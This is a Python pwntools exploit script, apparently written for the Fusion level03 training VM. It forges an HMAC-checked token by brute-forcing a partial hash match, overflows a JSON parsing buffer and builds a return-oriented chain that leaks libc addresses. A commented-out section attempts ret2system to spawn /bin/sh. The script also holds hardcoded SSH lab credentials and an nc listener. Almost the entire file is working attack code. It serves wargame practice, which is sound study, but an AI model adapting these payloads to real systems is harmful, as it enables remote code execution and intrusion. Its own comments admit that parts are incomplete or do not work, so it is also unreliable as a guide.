from pwn import *
from pwnhelper import *
from pwnhelper.dmesg import Dmesg
import json
import threading
import hmac
from hashlib import sha1
import time
import psutil

############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################


# no leading 0x
def bytechar_to_raw_hex_string(bc):
    raw_hex_string = hex(ord(bc)).replace("0x", "")
    # print("raw_hex_string:")
    # print(raw_hex_string)
    return raw_hex_string


def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=True)
    s.libs(remote_binary, local_dir)
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s




def gen_payload(token, content, serverip):

    while (True):
        title = random_string(20)

        # msg = json.dumps({
        #     "tags": tags,
        #     "title": title,
        #     "contents": content,
        #     "serverip": serverip
        # })

        # need to do this manually bc json.dumps refuses to accept bytes
        # but target json-c lib does not ;)
        msg = b"{\"tags\": [\"tag1\", \"tag2\", \"tag3\"], \"title\": \"" \
              + bytes(title, "utf-8") \
              + b"\", \"contents\": \"" + content \
              + b"\", \"serverip\": \"" + serverip + b"\"}"

        payload = b""
        payload += token
        payload += b"\n"
        payload += msg

        hashed = hmac.new(token, payload, sha1)
        first_bytes = hashed.hexdigest()[:4]

        # log.debug(f"first_bytes: {first_bytes}")

        if first_bytes == "0000":
            # found hash collision -> valid check passes
            log.debug(f"msg: {msg}")
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload

buf_filler_char = b"A"
overflow_char = b"B"

def gen_overflow_payload(token,overflow,serverip):
    content = b""
    content += buf_filler_char * 1023
    content += b"\\\\u"
    content += overflow
    log.debug(f"content: {content}")
    write("/tmp/docgil", content)
    return gen_payload(token,content,serverip)




############################################################################################################################################################
# INIT
############################################################################################################################################################

s = connect("03")
dmesg = Dmesg(s)


last_received_post = b""
def start_nc_listener():
    global last_received_post

    listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
    try:
        while True:
            log.info("nc listener waiting for data")
            data = listener_nc.recv()
            last_received_post = data
            log.info(f"nc listener received post: {data}")
    except EOFError:
        log.info("nc listener done, restarting...")
        start_nc_listener()

# open_plt = elf.plt["open"]
# fopen = elf.plt["fopen"]
# freopen = elf.plt["freopen"]


# log.info(f"open: {open}")
# log.info(f"fopen: {fopen}")
# log.info(f"freopen: {freopen}")

listener_port = "4000"
guest_ip = "192.168.2.129"
host_ip = "192.168.2.111"

serverip = bytes(host_ip + ":" + listener_port, "utf-8")
# serverip = "127.0.0.1:"+listener_port

log.info(f"serverip: {serverip}")

log.info("starting nc listener")
thread = threading.Thread(target=start_nc_listener)
thread.start()
sleep(1)


# log.info("############################################################################################################################################################")
# log.info("# GET POST REQUEST")
# log.info("############################################################################################################################################################")
#
#
# # connect to process
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# content = buf_filler_char*10
#
# payload = gen_payload(token, content, serverip)
# log.info(f"payload: {payload}")
# # nc.interactive()
# nc.send(payload)
# log.info("payload sent")
# # send EOF
# # nc.shutdown()
# # only close works here, not shutdown... idk why
# nc.close()
#
# sleep(1)
# assert content in last_received_post
# exit(0)

# log.info("############################################################################################################################################################")
# log.info("# SEGFAULT PROGRAM")
# log.info("############################################################################################################################################################")
# # connect to process
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# overflow = overflow_char * 1000
#
# payload = gen_overflow_payload(token, overflow, serverip)
# log.info(f"payload: {payload}")
# # nc.interactive()
# nc.send(payload)
# log.info("payload sent")
# # send EOF
# # nc.shutdown()
# # only close works here, not shutdown... idk why
# nc.close()
# nc.kill()
#
# # check if ret adr was overwritten
# time.sleep(1)
# crashed, report = dmesg.has_segfaulted("level03")
#
# assert crashed
# log.info(f"report: {report}")
# assert report.ip == 0x42424242
#
#
#
# log.info("############################################################################################################################################################")
# log.info("# FIND OVERFLOW_BYTES_UNTIL_RET_ADR")
# log.info("############################################################################################################################################################")
#
# # tested this out
# overflow_bytes_until_ret_adr = 160
# while True:
#     log.info("______________________________________________________________________________")
#     log.info(f"overflow_bytes_until_ret_adr: {overflow_bytes_until_ret_adr}")
#
#     nc = s.process(["nc", "localhost", port])
#     token = nc.recv().rstrip().replace(b"\"", b"")
#     log.info(f"token: {token}")
#     overflow = overflow_char * overflow_bytes_until_ret_adr
#     payload = gen_overflow_payload(token, overflow, serverip)
#     log.info(f"payload: {payload}")
#     nc.send(payload)
#     log.info("payload sent")
#     nc.close()
#
#     # check if ret adr was overwritten
#     time.sleep(0.5)
#     crash, report = dmesg.has_segfaulted("level03")
#     if crash:
#         log.warn("segfaulted")
#         log.warn(f"report: {report}")
#         ip = report.ip
#         log.warn("ip: " + hex(ip) + f" {ip}")
#
#         amount_overflowed = hex(ip).count(bytechar_to_raw_hex_string(overflow_char))
#         if amount_overflowed != 4:
#             log.info("did not overwrite ret adr fully yet")
#             overflow_bytes_until_ret_adr += 4
#             continue
#         else:
#             log.info("overwrote ret adr with precise value")
#             # subtract bc we want to stop right before ret adr
#             overflow_bytes_until_ret_adr = overflow_bytes_until_ret_adr - 4
#             break
#     else:
#         overflow_bytes_until_ret_adr += 4
#
# log.info(f"overflow_bytes_until_ret_adr: {overflow_bytes_until_ret_adr}")
# nc.kill()
#
# log.info("############################################################################################################################################################")
# log.info("# FIND LIBC BASE ADR")
# log.info("############################################################################################################################################################")


# # s.write(b"","/tmp/puts-got")
# # f = open(, "w")
# # fd = f.fileno()
# #
# # log.info(f"fd: {fd}")
# #
# # log.info("all open files")
# # proc = psutil.Process()
# # log.info(proc.open_files())

overflow_bytes_until_ret_adr = 164



log.info("trying to find aslr offset...")

# puts_plt = elf.plt["puts"]

exit_plt = elf.plt["exit"]
exit_got = elf.got["exit"]
write_plt = elf.plt["write"]

log.info("exit_plt: " + hex(exit_plt) + f" {exit_plt}")
log.info("exit_got: " + hex(exit_got) + f" {exit_got}")
log.info("write_plt: " + hex(write_plt) + f" {write_plt}")
# log.info(f"puts_plt: {puts_plt}")

nc = s.process(["nc", "localhost", port])
token = nc.recv().rstrip().replace(b"\"", b"")
log.info(f"token: {token}")

nc.interactive()

# WONT WORK SEE LIBREOFFICE DOC FOR ALTERNATIVE WAYS
overflow = b""
overflow += overflow_char * overflow_bytes_until_ret_adr
overflow += pack(write_plt, 32)
overflow += pack(exit_plt, 32)
# args for write:
# socket fd -> our nc connection
overflow += pack(0x3, 32)
overflow += pack(exit_got, 32)
overflow += pack(0x4, 32)


payload = gen_overflow_payload(token, overflow, serverip)
log.info(f"payload: {payload}")
nc.send(payload)
log.info("payload sent")
nc.close()


leaked_exit = unpack(nc.recv(4), 32)
log.info(f"leaked_exit: {leaked_exit}")
libc_base = leaked_exit - libc.symbols['exit']
log.info(f"libc_base: {libc_base}")

# ############################################################################################################################################################
# # RET 2 SYSTEM WITH "/bin/sh" arg -> Shell
# # ONLY WORKS IF WE MANAGE TO REOPEN STDIN AND STDOUT...
# ############################################################################################################################################################
#
#
# system_adr = libc_base + libc.symbols['system']
# bin_sh_adr = libc_base + next(libc.search(b"/bin/sh"))
#
# log.info(f"system_adr: {system_adr}")
# log.info(f"bin_sh_adr: {bin_sh_adr}")
#
# bin_sh = b"/bin/sh\x00"
#
# overflow += pack(system_adr, 32)
# overflow += pack(exit_plt, 32)
# overflow += pack(bin_sh_adr)
#
# payload = gen_overflow_payload(token, overflow, serverip)
# log.info(f"payload: {payload}")
# nc.send(payload)
# log.info("payload sent")
# # nc.close()
#
# crash, report = dmesg.has_segfaulted("level02", log=True)
# assert not crash
# shell = check_for_shell(nc)
# if shell:
#     nc.interactive()
#     exit(0)
# else:
#     exit(1)














